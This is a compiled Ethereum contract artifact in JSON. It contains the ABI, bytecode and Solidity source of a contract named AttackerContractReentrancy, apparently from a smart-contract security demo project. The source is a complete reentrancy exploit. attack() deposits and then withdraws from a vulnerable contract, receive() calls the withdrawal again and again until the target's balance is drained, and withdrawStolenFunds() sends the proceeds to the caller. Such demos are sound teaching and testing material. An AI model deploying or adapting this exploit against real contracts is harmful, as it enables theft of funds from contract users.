{
  "contractName": "AttackerContractReentrancy",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerableContract",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "WITHDRAW_AMOUNT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerableContract",
      "outputs": [
        {
          "internalType": "contract VulnerableContractReentrancy",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawStolenFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516105d93803806105d98339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b600081519050610087816100e8565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100c8565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100f1816100b6565b81146100fc57600080fd5b50565b6104cb8061010e6000396000f3fe6080604052600436106100435760003560e01c8063144166ae14610129578063205e2d79146101545780639e5faafc1461017f578063fd2767541461018957610124565b3661012457670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101225760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b81526004016100ef919061041b565b600060405180830381600087803b15801561010957600080fd5b505af115801561011d573d6000803e3d6000fd5b505050505b005b600080fd5b34801561013557600080fd5b5061013e6101a0565b60405161014b91906103e0565b60405180910390f35b34801561016057600080fd5b506101696101c4565b604051610176919061041b565b60405180910390f35b6101876101d0565b005b34801561019557600080fd5b5061019e610339565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000081565b670de0b6b3a764000034101561021b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610212906103fb565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561028b57600080fd5b505af115801561029f573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b8152600401610305919061041b565b600060405180830381600087803b15801561031f57600080fd5b505af1158015610333573d6000803e3d6000fd5b50505050565b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561037f573d6000803e3d6000fd5b50565b61038b81610471565b82525050565b600061039e601283610436565b91507f4e65656420696e697469616c2066756e647300000000000000000000000000006000830152602082019050919050565b6103da81610467565b82525050565b60006020820190506103f56000830184610382565b92915050565b6000602082019050818103600083015261041481610391565b9050919050565b600060208201905061043060008301846103d1565b92915050565b600082825260208201905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061047c82610483565b9050919050565b600061048e82610447565b905091905056fea2646970667358221220f0932fa6e0bf5f694f328fb4b0cada968edaf32ead8ea0376573c37fb8684b7764736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./VulnerableContractReentrancy.sol\";\n\ncontract AttackerContractReentrancy {\n    VulnerableContractReentrancy public vulnerableContract;\n    uint256 public constant WITHDRAW_AMOUNT = 1 ether;\n    \n    constructor(address _vulnerableContract) {\n        vulnerableContract = VulnerableContractReentrancy(_vulnerableContract);\n    }\n    \n    function attack() external payable {\n        require(msg.value >= WITHDRAW_AMOUNT, \"Need initial funds\");\n        \n        vulnerableContract.depositFunds{value: WITHDRAW_AMOUNT}();\n        \n        vulnerableContract.withdrawFunds(WITHDRAW_AMOUNT);\n    }\n    \n    // Fallback function that gets triggered when receiving ETH\n    receive() external payable {\n        if (address(vulnerableContract).balance >= WITHDRAW_AMOUNT) {\n            vulnerableContract.withdrawFunds(WITHDRAW_AMOUNT);\n        }\n    }\n    \n    function withdrawStolenFunds() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/Users/maochuansun/maochuan/Github/mcswing/ETHSecure/contracts/AttackerContractReentrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-12-02T18:40:51.154Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}